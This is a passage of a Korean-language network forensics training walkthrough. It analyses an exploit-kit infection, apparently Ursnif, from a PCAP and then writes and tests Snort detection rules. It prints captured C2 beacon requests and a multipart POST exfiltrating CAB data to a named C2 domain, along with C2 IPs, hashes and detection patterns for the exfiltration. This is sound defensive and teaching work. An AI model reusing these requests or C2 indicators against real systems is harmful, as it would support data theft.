- **`Accept`, `Accept-Language`, `Accept-Encoding` 헤더가 없습니다.** 진짜 IE는 항상 보냅니다. `User-Agent → Host → Connection → Cache-Control` 순서는 프로그램이 윈도우 WinINet 함수를 직접 부를 때 나오는 모양입니다 — **브라우저가 아니라는** 강한 신호이고 Snort 룰에도 쓸 수 있습니다.
- `Host: tplandthepropforcontent.com` — 두 C2 IP 모두 같은 Host → **C2 인프라 하나**.

### E6단계 — C2 업로드: CAB 파일 { #c2-upload }

같은 세션 아래쪽:

```text
POST /images/yGOF1OPRgpsNLYRRXk/ppY6ugq7p/AuVcfBXKaWwzpZnFmHWD/NP_2FE_2FtpGrGVR2wW/l8egMVa_2F2J3bVzYEopSE/9x13eCEuxGald/4PZpn53I/YHK3C6JsADqCyAvI5P5xFE2/ppdGcrvGHI/J4gDhoNmBEN9YEg_2/FbT4TaRl6abW/uD27YPGr.bmp HTTP/1.1
Content-Type: multipart/form-data; boundary=---------------------------693976939769397
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Host: tplandthepropforcontent.com
Content-Length: 430
Connection: Keep-Alive
Cache-Control: no-cache

-----------------------------693976939769397
Content-Disposition: form-data; name="upload_file"; filename="6D45.bin"
Content-Type: application/octet-stream

MSCF....(바이너리)....
-----------------------------693976939769397--

HTTP/1.1 200 OK
Server: nginx
Date: Fri, 05 Feb 2016 21:30:59 GMT
Content-Length: 0
```

**한 줄씩 읽기:**

- `multipart/form-data` — 웹 양식으로 **파일을 업로드**할 때 쓰는 형식입니다.
- `name="upload_file"; filename="6D45.bin"` — `6D45.bin`이라는 파일을 올립니다.
- **`MSCF`** — **Microsoft Cabinet(.cab)** 파일의 매직 바이트입니다(zip의 `PK`와 같은 원리).

악성코드가 **PC에서 모은 정보를 CAB으로 압축해서 C2에 올리고 있습니다.** 처음 올리는 건 보통 시스템 정보(컴퓨터 이름, 사용자, 설치된 프로그램)이고, 나중에는 브라우저에서 가로챈 자격 증명이나 은행 정보가 나갈 수 있습니다 — 재무이사 PC라 특히 심각합니다. 이런 POST가 네 번 있습니다(`CTU.bmp`, `uD27YPGr.bmp`, `qS.bmp`, `Pspw_2F.bmp`) — Zeek `files.log`의 CAB 파일 네 개입니다.

`upload_file` + `XXXX.bin` CAB 업로드와 `/images/<base64>/` URL은 **Ursnif(Gozi-ISFB)**의 특징으로 널리 알려져 있습니다. 추정이며 확정은 아닙니다.

```text
[261118 2212, Analyst] Reviewing C2 session 185.86.77.12:80 (Host tplandthepropforcontent.com) - Found: GET /images/<b64>/3.gif -> 200 Content-Length 0 (beacon); POST /images/<b64>/uD27YPGr.bmp multipart upload_file "6D45.bin" starting "MSCF" (CAB) - data exfiltration
[261118 2213, Analyst] CORRECTION: 4x application/vnd.ms-cab-compressed in zeek:files are the 4 CAB uploads to C2 (CTU.bmp, uD27YPGr.bmp, qS.bmp, Pspw_2F.bmp), not Windows CTL downloads
[261118 2214, Analyst] Assessment: C2 URL/upload pattern consistent with Ursnif (Gozi/ISFB) family - Further Analysis Required (hash lookup / OSINT)
```

### E7단계 — C2 모듈 다운로드와 서버 시계 { #c2-module }

```text
ip == 192.210.137.123
```

세션 49303(21:31:03 – 21:32:39), natural 보기:

```text
GET /images/lYPocsAb06v/c8XQqRymQmAJFP/h_2B5m1KKRf5r1Y4_2B3G/oZmZCYB7EfcekWtW/Z1Y39RsTdnI08N6/cKQZGqmzVSGNWyTKcD/mU2QZV17k/dpJggBEqg1bEhLhkbq1f/hid9gA6NIhk22NhvpaS/kdbnxdC3W3/i.jpeg HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
Host: tplandthepropforcontent.com
Connection: Keep-Alive
Cache-Control: no-cache

HTTP/1.1 200 OK
Server: nginx
Date: Fri, 05 Feb 2016 22:28:56 GMT
Content-Type: application/octet-stream
Connection: keep-alive
Content-Length: 230507

(무작위처럼 보이는 바이트 …)
```

General/HTTP 패널: Dst IP 192.210.137.123 { ARIN }, Dst databytes 230,666, libfile content type `application/octet-stream`, **Body MD5 `032557398230f49a5310a9a60f00e33b`**.

**결과 읽기:**

- `.jpeg` 요청에 **230,507바이트 `octet-stream`**이 왔고 내용이 무작위처럼 보입니다 → **암호화된 모듈이나 설정 파일**.
- UA가 `MSIE 8.0`(21:30:54까지)에서 **IE11 문자열**(21:31:03부터)로 바뀌었지만 여전히 **`Accept` 헤더가 없습니다** — 그러니 여전히 진짜 브라우저가 아니고, 악성코드가 자기 UA 문자열을 바꾼 것입니다(새 설정이나 모듈 이후일 수 있음).

!!! note "정정 — '브라우저 안에 숨었다'?"
    처음에는 IE11 UA로 바뀐 걸 IE 인젝션 가능성으로 읽었습니다. `Accept` 헤더가 없다는 점은 오히려 **악성코드가 자기 UA 문자열을 바꾼 것**을 가리킵니다. 인젝션 여부는 네트워크 결론이 아니라 호스트 오퍼레이터가 확인할 문제(메모리 분석)로 남깁니다.

**서버 시계가 다름:**

| C2 | HTTP `Date` 헤더 | 캡처 시각 | 차이 |
|---|---|---|---|
| 185.86.77.12 (RIPE) | 21:30:48 | 21:30:48 | 없음 |
| 192.210.137.123 (ARIN) | **22:28:56** | 21:31:03 | **약 58분 빠름** |

도메인 하나 뒤의 물리적으로 다른 서버 두 대입니다. 시계 관리가 엉망이면 빌리거나 해킹한 서버일 가능성도 있습니다.

```text
[261118 2220, Analyst] Reviewing C2 session 192.210.137.123:80 (49303) - Found: GET /images/<b64>/i.jpeg returned application/octet-stream 230,507 bytes (encrypted module/config), Body MD5 032557398230f49a5310a9a60f00e33b; UA switched MSIE 8.0 -> IE11 string at 21:31:03Z, no Accept headers (non-browser)
[261118 2221, Analyst] Note: 192.210.137.123 HTTP Date header 22:28:56 GMT vs capture 21:31:03Z (~58 min skew) - separate server from 185.86.77.12 behind same C2 domain
```

### E8단계 — 폐쇄망에서 해시 다루기 { #hashes }

!!! question "질문: 폐쇄망이라 VirusTotal 조회를 못 하는데 어떻게 하나요?"
    1. **그래도 해시는 기록합니다.** 다른 사람에게는 IOC입니다: "Hash reputation lookup not performed – closed network. Hashes recorded for MC / intel cell follow-up."
    2. **SHA256도 구합니다.** Arkime는 MD5만 보여 주고, 정보 공유는 보통 SHA256을 씁니다. 저장한 PCAP에서 파일을 꺼냅니다(아래).
    3. **내부 위협 정보를 확인합니다.** 킷에 있다면(오프라인 MISP, 이전 사건 IOC 목록).
    4. **행동으로 판단합니다.** referrer 사슬, EK URL 모양, 암호화된 페이로드, C2 체크인, CAB 업로드 — 모두 네트워크 행동 증거이고, 네트워크 대응 결론의 핵심입니다.
    5. **계열 이름은 "consistent with … – unconfirmed"로** 적고, 사실처럼 단정하지 않습니다.

tshark로 오프라인 SHA256 구하기(분석 VM 안에서):

```bash
mkdir ~/evidence/http_objects
tshark -r ~/evidence/261118_dekker-pc_full.pcap --export-objects http,$HOME/evidence/http_objects
ls -l ~/evidence/http_objects
sha256sum ~/evidence/http_objects/*
md5sum ~/evidence/http_objects/*
```

- `tshark` — Wireshark의 명령줄 버전. `-r`은 PCAP을 읽습니다.
- `--export-objects http,<폴더>` — **HTTP로 오간 모든 파일**을 폴더에 저장합니다(= Wireshark *File → Export Objects → HTTP*).
- `ls -l` — 크기로 파일을 찾습니다(38,557 Flash, 360,468 페이로드, 230,507 모듈).
- `md5sum` 값이 Arkime **Body MD5**와 같으면 제대로 꺼낸 것입니다.
- 이 파일들은 절대 VM 밖으로 옮기지 말고, `.bin`을 붙여 이름을 바꾸세요.

| 단계 | 서버 / 세션 | URI | 크기 | Body MD5 |
|---|---|---|---|---|
| 게이트 Flash | 85.93.0.32 / 49257 | `/shop.php?sid=` | 1,983 | 5e251668b8a3e02e9da376d6f7da8229 |
| EK Flash 익스플로잇 | 86.106.93.167 / 49278 | `/charge.zhtml` | 38,557 | cf90ba155fda322eeadd2fdeb4368849 |
| EK 페이로드 | 86.106.93.167 / 49284 | `/today.jst` | 360,468 | 4466cd2032944d03ffe9d4d7d74083c2 |
| C2 모듈 | 192.210.137.123 / 49303 | `/images/…/i.jpeg` | 230,507 | 032557398230f49a5310a9a60f00e33b |
| (EK 랜딩) | 86.106.93.167 / 49279 | `/civis/index.php` … | 약 100KB | 49143103…, f51880eb…, 27776220… |

```text
[261118 2222, Analyst] Hash reputation lookup - Not performed: closed network. MD5s recorded; SHA256 to be generated from exported PCAP (tshark --export-objects http) for MC/intel follow-up
```

### E9단계 — 증거 PCAP 저장 { #export-pcap }

!!! question "질문: 저장할 때 꼭 필터 쿼리를 걸어야 하나요? 어차피 작으니 전체를 저장하면 안 되나요?"
    전체 저장이 틀린 건 아닙니다. 가장 좋은 건 **둘 다**입니다.

    - **원본 전체 — 보존용.** 이미 있습니다(처음 받은 파일). 다시 내보내기보다는 경로와 **SHA256**(`sha256sum <파일>`)을 기록하세요 — 분석한 원본이 바뀌지 않았다는 증거(증거 보관 연속성)입니다. 다시 내보낸 파일은 패킷 순서나 형식이 달라질 수 있습니다.
    - **필터한 캡처 — "관심 트래픽"용.** 받는 사람이 연결 321개가 아니라 사슬만 봅니다. Snort 테스트가 깔끔해집니다(악성만 든 파일로 탐지, 전체 파일로 오탐 확인). 관계없는 사용자 웹 사용 기록을 덜 퍼뜨립니다. 실제 센서(시간당 수십 GB)에서는 필터가 필수입니다.

    이번 연습에서는 전체 PCAP을 저장했습니다 — 그럴 땐 티켓에 어느 시간대와 IP를 보면 되는지 적어 주세요.

[E1](#arkime-chain)보다 나은 필터 — **DNS** 세션(도착 IP가 아니라 내부 DNS 서버로 감)까지 담습니다.

```text
ip == 10.41.245.114 && (ip.dst == [213.174.33.141, 85.93.0.32, 86.106.93.167, 185.86.77.12, 192.210.137.123] || host.dns == [www.source-werbeartikel.com, lsbery.tk, bsbkxs.zdxwx3m.pw, tplandthepropforcontent.com])
```

- `( … || … )` — 둘 중 하나라도.
- `host.dns == [ … ]` — DNS 질의 이름이 목록에 있는 세션.

**저장:** 검색 → **Actions (⋯) → Export PCAP → Matching items**, 또는 원본 복사:

```bash
mkdir -p ~/evidence
cp <원본-pcap> ~/evidence/261118_dekker-pc_full.pcap
sha256sum ~/evidence/261118_dekker-pc_full.pcap
```

---

## F부 — Snort 룰 만들고 테스트하기 { #snort }

### F0단계 — 준비 { #snort-prep }

```bash
snort -V
grep -n "ipvar HOME_NET" /etc/snort/snort.conf
grep -n "local.rules" /etc/snort/snort.conf
grep -n "RULE_PATH" /etc/snort/snort.conf | head -3
```

- `snort -V` — 버전. **2.9.x**면 아래 룰을 그대로 씁니다(`alert.log` CSV 형식도 Snort 2였음). Snort 3는 문법이 다릅니다.
- `grep -n "글자" 파일` — 그 글자가 있는 줄을 줄 번호와 함께 보여 줍니다.
- **`ipvar HOME_NET`** — Snort가 "내부"로 보는 범위. 예를 들어 `10.0.0.0/24`면 우리 PC `10.41.245.114`는 "내부"가 아니라서 **`$HOME_NET`을 쓰는 룰이 하나도 안 울립니다.** 테스트할 땐 `10.0.0.0/8`이나 `any`로 바꾸세요.
- **`include $RULE_PATH/local.rules`** — 앞에 `#`가 있으면 안 됩니다.
- `RULE_PATH` — `local.rules` 위치(예: `/etc/snort/rules/local.rules`). 설정 파일이 다른 곳이면 `find / -name snort.conf 2>/dev/null`.
- 예전 **테스트 룰 sid 1000100**은 `#`로 꺼 두세요. 모든 패킷에 울려서 결과를 묻어 버립니다.

### F1단계 — 룰의 구조 { #rule-anatomy }

```text
alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"..."; ...옵션...; sid:1000101; rev:1;)
└─┬─┘ └┬┘ └───┬───┘ └┬┘ └┬┘ └─────┬─────┘ └────┬────┘ └──────────────────┬──────────────────┘
 동작 프로토콜 출발IP  출발포트 방향  도착IP       도착포트                   옵션(괄호 안)
```

**헤더** — 어떤 패킷을 볼지: `alert`(알림 남김), `tcp`/`udp`, `$HOME_NET`/`$EXTERNAL_NET`/`$HTTP_PORTS`(`snort.conf`의 변수), `->`(방향).

**옵션** — 안에서 무엇을 찾을지:

| 옵션 | 뜻 |
|---|---|
| `msg:"…"` | 알림 제목 |
| `flow:established,to_server` | 연결이 맺어진 뒤 **서버 쪽으로** 가는 데이터만(`to_client` = 반대) |
| `content:"글자"` | 이 글자가 있어야 함. `\|3a\|` = 16진수 바이트(`3a` = `:`, `22` = `"`) |
| `content:!"글자"` | 이 글자가 **없어야** 함 |
| `nocase` | 대소문자 무시 |
| `http_uri` / `http_header` / `http_method` / `http_client_body` | 앞의 `content`를 HTTP의 어디서 찾을지(URI / 헤더 / GET·POST / POST 내용) |
| `depth:8` | 앞 8바이트 안에서만 |
| `distance:0` | 앞의 일치 **뒤쪽에서** |
| `pcre:"/정규식/U"` | 정규식, `U` = URI에서 |
| `urilen:>150` | URI가 150자보다 김 |
| `flowbits` | 연결에 표시를 남기고 / 확인(sid 1000107/1000108 참고) |
| `flags:S` | TCP SYN(연결 시작)만 |
| `classtype` | 알림 분류 |
| `sid` / `rev` | 룰 번호 / 수정 번호. 직접 만든 룰은 **1,000,000 이상** |

!!! warning "룰 하나 = 한 줄"
    Snort 2에서 룰은 **반드시 한 줄**이어야 합니다. 복사할 때 룰 중간에 줄바꿈이 들어가지 않게 조심하세요.

룰은 두 종류입니다.

- **IOC 룰** — 이번 사례의 정확한 도메인/IP. 정확하지만 공격자가 바꾸면 못 잡습니다.
- **행동 룰** — 공격의 **모양**. 같은 도구라면 도메인/IP가 바뀌어도 잡힙니다. 오탐 위험이 조금 있습니다.

### F2단계 — 룰 하나씩 { #snort-rules }

#### A. IOC — DNS 질의 (sid 1000101–1000103) { #rules-dns }

```text
alert udp $HOME_NET any -> any 53 (msg:"LOCAL EK gate DNS query lsbery.tk"; content:"|06|lsbery|02|tk|00|"; nocase; classtype:trojan-activity; sid:1000101; rev:1;)
alert udp $HOME_NET any -> any 53 (msg:"LOCAL EK server DNS query *.zdxwx3m.pw"; content:"|07|zdxwx3m|02|pw|00|"; nocase; classtype:trojan-activity; sid:1000102; rev:1;)
alert udp $HOME_NET any -> any 53 (msg:"LOCAL C2 DNS query tplandthepropforcontent.com"; content:"|17|tplandthepropforcontent|03|com|00|"; nocase; classtype:trojan-activity; sid:1000103; rev:1;)
```

- DNS는 점 대신 **글자 수 + 글자**로 이름을 적습니다: `|06|lsbery|02|tk|00|` = 6글자, 2글자, 끝.
- `|07|zdxwx3m|02|pw|00|`는 일부러 `bsbkxs.`를 뺐습니다. EK는 서브도메인을 자주 바꾸니, 뒤의 도메인만 잡으면 `xxxx.zdxwx3m.pw` 전부를 잡습니다.
- `|17|` — 16진수 17 = 23, `tplandthepropforcontent`의 글자 수.
- `-> any 53` — 어느 DNS 서버로 묻든.

아무 도메인이나 DNS 형식으로 바꾸기:

```bash
python3 -c "
d='tplandthepropforcontent.com'
print(''.join('|%02x|%s' % (len(l), l) for l in d.split('.')) + '|00|')"
```

#### B. IOC — C2 IP 연결 시도 (sid 1000104) { #rules-ip }

```text
alert tcp $HOME_NET any -> [185.86.77.12,192.210.137.123] any (msg:"LOCAL C2 connection attempt to known C2 IP"; flags:S; classtype:trojan-activity; sid:1000104; rev:1;)
```

- `[a,b]` — IP 목록.
- `flags:S` — **SYN(연결 첫 패킷)만**. 이게 없으면 IP만 보는 룰이 **모든 패킷마다** 울려서 알림이 수백 개가 됩니다. IP만 보는 룰은 항상 범위를 좁히세요.

#### C. 행동 — 게이트 URL 모양 (sid 1000105) { #rules-gate }

```text
alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"LOCAL EK gate request /shop.php or /hot.php with long hex id"; flow:established,to_server; content:".php?"; http_uri; pcre:"/\/(?:shop|hot)\.php\?s?id=[0-9A-F]{64,}$/U"; classtype:trojan-activity; sid:1000105; rev:1;)
```

- `content:".php?"; http_uri;` — 느린 정규식 전에 빠르게 거르는 단계(좋은 습관).
- 정규식: `\/(?:shop|hot)\.php` = `/shop.php` 또는 `/hot.php`, `\?s?id=` = `?id=` 또는 `?sid=`, `[0-9A-F]{64,}` = 대문자 16진수 64개 이상(이번 ID는 86자), `$` = URI 끝.
- 도메인을 안 보니 게이트 도메인이 바뀌어도 잡힙니다.

#### D. 행동 — EK 랜딩 (sid 1000106) { #rules-landing }

```text
alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"LOCAL Angler-like EK landing index.php?PHPSESSID=&action="; flow:established,to_server; content:"/index.php?PHPSESSID="; http_uri; content:"&action="; http_uri; distance:0; classtype:trojan-activity; sid:1000106; rev:1;)
```

- `PHPSESSID`는 원래 **쿠키**로 오갑니다. URL에 있고 바로 뒤에 `&action=`이 붙는 게 이 랜딩 페이지의 지문입니다.

#### E. 행동 — flowbits로 EK 페이로드 잡기 (sid 1000107–1000108) { #rules-payload }

페이로드는 **서버 응답**이고, `application/octet-stream`만으로는 아무 다운로드나 걸립니다. 그래서 **게이트를 거쳐 온** 요청에 표시를 하고, 그 연결의 응답만 확인합니다.

```text
alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"LOCAL EK request referred by gate hot.php - set flowbit"; flow:established,to_server; content:"/hot.php?id="; http_header; flowbits:set,ek.from_gate; flowbits:noalert; classtype:trojan-activity; sid:1000107; rev:1;)
alert tcp $EXTERNAL_NET $HTTP_PORTS -> $HOME_NET any (msg:"LOCAL EK payload download (octet-stream after gate referral)"; flow:established,to_client; flowbits:isset,ek.from_gate; content:"application/octet-stream"; http_header; nocase; classtype:trojan-activity; sid:1000108; rev:1;)
```

- 룰 1: **요청 헤더**(Referer)에 게이트 주소 → `flowbits:set,ek.from_gate`로 연결에 표시, `flowbits:noalert` = 이 룰 자체는 알림 없음.
- 룰 2: 반대 방향(`to_client`) — **서버의 응답**, `flowbits:isset` = 표시된 연결만, `application/octet-stream`이면 알림.
- 이 캡처에서 referer가 `hot.php`인 요청은 둘입니다: 랜딩 페이지(응답 `text/html`)와 페이로드(`octet-stream`). 페이로드에서만 알림이 떠야 합니다.

#### F. IOC — C2 Host 헤더 (sid 1000109) { #rules-host }

```text
alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"LOCAL C2 HTTP request Host tplandthepropforcontent.com"; flow:established,to_server; content:"Host|3a| tplandthepropforcontent.com"; http_header; nocase; classtype:trojan-activity; sid:1000109; rev:1;)
```

- `Host|3a| ` = `Host: `. IP가 바뀌어도 C2를 잡습니다.

#### G. 행동 — C2 비콘 모양 (sid 1000110) { #rules-beacon }

```text
alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"LOCAL Ursnif-like C2 beacon - long /images/ base64 path, no Accept header"; flow:established,to_server; content:"GET"; http_method; content:"/images/"; http_uri; depth:8; urilen:>150; content:!"Accept"; http_header; pcre:"/^\/images\/(?:[A-Za-z0-9_]+\/){6,}[A-Za-z0-9_]+\.(?:gif|jpeg|bmp)$/U"; classtype:trojan-activity; sid:1000110; rev:1;)
```

조건이 **모두** 맞아야 합니다.

- `GET` 메서드.
- URI가 `/images/`로 **시작**(`depth:8`).
- `urilen:>150` — 진짜 그림 주소는 이렇게 길지 않습니다.
- `content:!"Accept"; http_header;` — **Accept 헤더 없음**(진짜 브라우저는 항상 보냄).
- 정규식: `/images/` + 영문/숫자/`_`로 된 폴더 **6개 이상** + `이름.gif|jpeg|bmp`.

도메인도 IP도 안 봅니다 — 같은 악성코드가 C2를 바꿔도 잡힙니다.

#### H. 행동 — CAB 업로드 / 유출 (sid 1000111) { #rules-exfil }

```text
alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"LOCAL Ursnif-like exfil - POST upload_file .bin containing CAB (MSCF)"; flow:established,to_server; content:"POST"; http_method; content:"name=|22|upload_file|22|"; http_client_body; content:".bin|22|"; http_client_body; distance:0; content:"MSCF"; http_client_body; distance:0; classtype:trojan-activity; sid:1000111; rev:1;)
```

- `http_client_body` — **POST로 보낸 내용** 안에서 찾습니다.
- `name=|22|upload_file|22|` = `name="upload_file"`, 그다음 `.bin"`, 그다음 `MSCF`(CAB 매직) — **순서대로**(`distance:0`). Arkime에서 본 업로드 모양 그대로입니다.

### F3단계 — PCAP으로 테스트하기 { #snort-test }

1. 11줄을 `local.rules`에 붙여 넣고(예: `sudo nano /etc/snort/rules/local.rules`) sid 1000100을 끕니다.
2. 문법 검사:

```bash
sudo snort -T -c /etc/snort/snort.conf
```

- `-T` — 실제로 돌리지 않고 설정과 룰만 검사합니다. 성공하면 마지막에 `Snort successfully validated the configuration!`이 나옵니다. 오류는 몇 번째 줄인지 알려 줍니다 — 보통 `"`나 `;` 빠짐, 또는 룰 안의 줄바꿈입니다.

3. PCAP에 돌리기:

```bash
mkdir -p /tmp/snorttest
sudo snort -c /etc/snort/snort.conf -r ~/Downloads/Investigation1.pcap -A console -q -k none -U -l /tmp/snorttest
```

- `-r 파일` — 실시간 네트워크 대신 **PCAP 파일**을 읽습니다.
- `-A console` — 알림을 화면에 바로 보여 줍니다.
- `-q` — 시작 안내문을 안 보여 줍니다.
- **`-k none`** — **체크섬 검사를 끕니다.** 캡처에는 "틀린" 체크섬 패킷이 흔하고(랜카드 오프로딩), Snort가 그 패킷을 버리면 룰이 조용히 안 울립니다. PCAP 테스트의 아주 흔한 함정입니다.
- `-U` — 시각을 **UTC**로 보여 줘서 타임라인과 바로 비교할 수 있습니다.
- `-l /tmp/snorttest` — 테스트용 로그 폴더. Splunk가 읽는 실제 `alert.log`를 더럽히지 않습니다.

4. 룰별 개수 세기:

```bash
sudo snort -c /etc/snort/snort.conf -r ~/Downloads/Investigation1.pcap -A console -q -k none -U -l /tmp/snorttest | grep -o "\[1:[0-9]*:[0-9]*\] [^[]*" | sort | uniq -c
```

- `grep -o "…"` — 알림 줄에서 `[1:sid:rev] 제목` 부분만 뽑습니다.
- `sort | uniq -c` — 같은 것끼리 모아 개수를 셉니다.

### F4단계 — 알림 한 줄 읽기 { #alert-line }

```text
02/05-21:28:23.927822  [**] [1:1000101:1] LOCAL EK gate DNS query lsbery.tk [**] [Classification: A Network Trojan was detected] [Priority: 1] {UDP} 10.41.245.114:61377 -> 10.2.41.7:53
```

- `02/05-21:28:23.927822` — 패킷 시각(`-U` 때문에 UTC).
- `[1:1000101:1]` — `[엔진:sid:rev]` — 어느 룰이 울렸는지.
- 제목, 분류, 우선순위.
- `{UDP} 출발 -> 도착` — 일치한 패킷.

### F5단계 — 실제 결과 { #snort-results }

**실제 출력(출력된 순서):**

```text
02/05-21:28:23.927822  [1:1000101:1] LOCAL EK gate DNS query lsbery.tk  {UDP} 10.41.245.114:61377 -> 10.2.41.7:53
02/05-21:28:24.629939  [1:1000105:1] LOCAL EK gate request /shop.php or /hot.php with long hex id  {TCP} 10.41.245.114:49257 -> 85.93.0.32:80
02/05-21:28:25.642147  [1:1000102:1] LOCAL EK server DNS query *.zdxwx3m.pw  {UDP} 10.41.245.114:49890 -> 10.2.41.7:53
02/05-21:28:25.211436  [1:1000105:1] LOCAL EK gate request /shop.php or /hot.php with long hex id  {TCP} 10.41.245.114:49258 -> 85.93.0.32:80
02/05-21:28:40.899691  [1:1000103:1] LOCAL C2 DNS query tplandthepropforcontent.com  {UDP} 10.41.245.114:56313 -> 10.2.41.7:53
02/05-21:28:33.836130  [1:1000108:1] LOCAL EK payload download (octet-stream after gate referral)  {TCP} 86.106.93.167:80 -> 10.41.245.114:49284
02/05-21:28:26.013021  [1:1000106:1] LOCAL Angler-like EK landing index.php?PHPSESSID=&action=  {TCP} 10.41.245.114:49279 -> 86.106.93.167:80
02/05-21:28:41.299346  [1:1000104:1] LOCAL C2 connection attempt to known C2 IP  {TCP} 10.41.245.114:49296 -> 185.86.77.12:80
02/05-21:28:41.571373  [1:1000109:1] LOCAL C2 HTTP request Host tplandthepropforcontent.com  {TCP} 10.41.245.114:49296 -> 185.86.77.12:80
02/05-21:28:41.571373  [1:1000110:1] LOCAL Ursnif-like C2 beacon - long /images/ base64 path, no Accept header  {TCP} 10.41.245.114:49296 -> 185.86.77.12:80
02/05-21:28:52.293726  [1:1000109:1] LOCAL C2 HTTP request Host tplandthepropforcontent.com  {TCP} 10.41.245.114:49296 -> 185.86.77.12:80
02/05-21:28:52.293726  [1:1000111:1] LOCAL Ursnif-like exfil - POST upload_file .bin containing CAB (MSCF)  {TCP} 10.41.245.114:49296 -> 185.86.77.12:80
02/05-21:31:02.298827  [1:1000103:1] LOCAL C2 DNS query tplandthepropforcontent.com  {UDP} 10.41.245.114:56397 -> 10.2.41.7:53
02/05-21:30:43.307105  [1:1000104:1] LOCAL C2 connection attempt to known C2 IP  {TCP} 10.41.245.114:49297 -> 185.86.77.12:80
02/05-21:30:43.576908  [1:1000109:1] … 49297    02/05-21:30:43.576908  [1:1000110:1] … 49297
02/05-21:30:54.719242  [1:1000109:1] … 49297    02/05-21:30:54.719242  [1:1000111:1] … 49297
02/05-21:31:03.097060  [1:1000104:1] … 49304 -> 192.210.137.123:80
02/05-21:31:03.096988  [1:1000104:1] … 49303 -> 192.210.137.123:80
02/05-21:31:03.312196  [1:1000109:1] … 49303    02/05-21:31:03.312196  [1:1000110:1] … 49303
02/05-21:32:39.328746  [1:1000104:1] … 49317
02/05-21:32:39.753652  [1:1000109:1] … 49317    02/05-21:32:39.753652  [1:1000110:1] … 49317
02/05-21:33:03.499851  [1:1000109:1] … 49317    02/05-21:33:03.499851  [1:1000110:1] … 49317
02/05-21:33:16.085131  [1:1000109:1] … 49317    02/05-21:33:16.085131  [1:1000111:1] … 49317
02/05-21:35:00.140031  [1:1000104:1] … 49331
02/05-21:35:00.139959  [1:1000104:1] … 49330
02/05-21:35:00.286958  [1:1000109:1] … 49330    02/05-21:35:00.286958  [1:1000110:1] … 49330
02/05-21:32:39.328970  [1:1000104:1] … 49318
02/05-21:35:15.789369  [1:1000104:1] … 49381
02/05-21:35:15.789133  [1:1000104:1] … 49380
02/05-21:35:15.950613  [1:1000109:1] … 49380    02/05-21:35:15.950613  [1:1000111:1] … 49380
```

(줄였습니다: `[**]`, 분류, 우선순위 생략. `…` = `10.41.245.114:<포트> -> <C2>:80`.)

| sid | 룰 | 예상 | **실제** | 알림 위치 |
|---|---|---|---|---|
| 1000101 | DNS lsbery.tk | 1 | **1** ✅ | 21:28:23 |
| 1000102 | DNS *.zdxwx3m.pw | 1 | **1** ✅ | 21:28:25 |
| 1000103 | DNS C2 도메인 | 2 | **2** ✅ | 21:28:40, 21:31:02 |
| 1000104 | C2 IP SYN | = C2로 간 TCP 연결 수 | **10** | 185.86.77.12 ×2, 192.210.137.123 ×8 |
| 1000105 | 게이트 URL 모양 | 2 | **2** ✅ | 49257(`shop.php`), 49258(`hot.php`) |
| 1000106 | EK 랜딩 | 1 | **1** ✅ | 49279 |
| 1000108 | EK 페이로드(flowbits) | 1 | **1** ✅ | 86.106.93.167 → 49284 |
| 1000109 | C2 Host 헤더 | 10 | **10** ✅ | GET ×6, POST ×4 |
| 1000110 | C2 비콘 모양 | 6 | **6** ✅ | 49296, 49297, 49303, 49317 ×2, 49330 |
| 1000111 | CAB 업로드 | 4 | **4** ✅ | 49296, 49297, 49317, 49380 |

**결과 읽기:**

1. **flowbits가 제대로 동작했습니다.** sid 1000108은 페이로드 세션(49284)에서만 울렸고, 같은 표시가 붙은 랜딩 세션(49279)은 응답이 `text/html`이라 조용했습니다.
2. **SYN만 있는 연결 네 개**(49304, 49318, 49331, 49381) — sid 1000104만 울리고 Host/비콘 알림은 없습니다. [E2](#idle-sessions)의 "7패킷 빈 연결"입니다. Snort도 이 연결들에 **HTTP 요청이 한 번도 없었다**고 확인해 줍니다.
3. **오탐 0개.** 캡처에는 구글, 마이크로소프트, 페이스북, 야후, 해킹된 쇼핑몰 트래픽도 있는데, 알림은 모두 사슬의 IP와 그 DNS 질의에서만 떴습니다.

!!! question "질문: 출력이 왜 시간 순서가 아닌가요?"
    HTTP는 Snort가 **TCP 흐름을 다시 조립한 뒤** 룰을 검사합니다. 그래서 조립이 끝나는 시점에 알림이 출력되고, 다른 알림보다 늦게 찍힐 수 있습니다. 각 알림의 **시각**은 여전히 실제 패킷 시각입니다. 타임라인은 출력 순서가 아니라 **시각**으로 정렬하세요.

### F6단계 — 더 연습할 거리 { #snort-more }

- `/charge.zhtml`용 **Flash 익스플로잇 룰**: 무작위 영어 단어 파라미터 + `x-flash-version` 헤더.
- **오래된 Flash(정책 룰):** URI의 `version.xml15.0.0.`으로 공격 전에 **패치 안 된 PC**를 찾습니다.
- 팀 킷이 Snort 3로 바뀌면 **Snort 3 문법**(sticky buffer)으로 바꿔 보기.

```text
[261118 2230, Analyst] Writing Snort rules for gate/EK/C2/exfil (sid 1000101-1000111) - Found
[261118 2345, Analyst] Testing Snort rules sid 1000101-1000111 against full PCAP (snort -A console -q -k none -U) - Found: all rules fired as expected, 0 alerts on benign traffic
```

---

## G부 — 타임라인, IOC, 단서 { #results }

### 타임라인 (UTC, 2016-02-05) { #timeline }

| 시각 | 사건 |
|---|---|
| 08:12 | 캠페인 A가 `invoice304-3/18/25/27.js` 생성(공격자 시계 UTC+4) |
| 09:27:04 | 메일 1 → mtsutsumi (TLS) |
| 09:34:13 | 메일 2 → jdekker (TLS, 2/3 05:05 생성) |
| 11:42:38 | 메일 3 → smunro |
| 13:30:37 | 메일 4 → mtraugott (TLS) |
| 13:40:27 | 메일 5 → smunro |
| 18:23:42 | 메일 6 → jdekker (mx2) |
| 18:23:43 | 메일 7 → culyanova |
| **21:24:05** | **PCAP 시작**, DHCP REQUEST/INFORM, Microsoft NCSI(Dekker-PC가 네트워크에 붙음) |
| 21:27:15 | 웹서핑(148.251.255.26) |
| 21:28:15 | DNS `www.source-werbeartikel[.]com` → 213.174.33.141 |
